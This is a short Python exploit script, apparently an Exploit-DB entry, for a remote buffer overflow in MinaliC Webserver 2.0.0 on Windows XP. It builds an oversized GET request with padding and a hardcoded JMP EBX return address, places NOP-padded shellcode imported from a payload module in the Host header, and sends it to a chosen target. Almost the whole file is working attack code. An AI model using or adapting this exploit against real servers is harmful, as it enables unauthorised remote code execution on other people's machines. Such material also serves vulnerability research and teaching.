#!/usr/bin/env python

# Exploit Title: MinaliC Webserver buffer overflow
# Date: 12 Apr 2013
# Exploit Author: superkojiman - http://www.techorganic.com
# Vendor Homepage: http://minalic.sourceforge.net/
# Version: MinaliC Webserver 2.0.0
# Tested on: Windows XP Pro SP2, English
#
# Description: 
# Remote command execution by triggering a buffer overflow in the GET
# request. 
#
from payload import buf
import socket
import struct

def shell_attack(target_machine, target_port):


    # 74 bytes calc.exe from http://code.google.com/p/win-exec-calc-shellcode/
    

    # EIP at offset 245 when minalic.exe is in C:\minalic\bin 
    # EBX points directly to the "Host:" value, so we put our shellcode there. 
    # JMP EBX @ 0x7C955B47, NTDLL.DLL, Windows XP Pro SP2 English

    # Exploit-DB Note:
    # ret = struct.pack("<I", 0x77c11f13)     # jmp ebx msvcrt.dll Windows XP SP3 English

    junk = b"\x41" * 245
    ret = struct.pack(b"<I", 0x7C955B47)
    host = b"\x90" * 30 + buf + b"\x90" * 31

    buffer = b"GET /" + junk + ret + b" HTTP/1.1\r\n" + b"Host: " + host + b"\r\n\r\n"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_machine, target_port))
    s.send(buffer)
    s.close()
    